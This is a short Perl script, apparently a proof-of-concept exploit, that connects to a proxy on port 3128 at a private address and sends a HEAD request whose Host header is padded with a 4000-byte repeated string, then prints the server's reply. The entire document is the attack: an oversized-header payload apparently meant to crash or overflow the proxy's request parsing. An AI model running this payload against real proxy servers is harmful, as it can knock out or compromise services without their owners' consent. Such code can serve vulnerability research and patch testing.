use IO::Socket;

my $sock = IO::Socket::INET->new(PeerAddr => '192.168.27.146',
                              PeerPort => '3128',
                              Proto    => 'tcp');
$a = "yc" x 2000;
print $sock "HEAD http://www.example..com/ HTTP/1.1\r\nHost: yahoo.com:$a\r\n\r\n";
while(<$sock>) {
print;
}
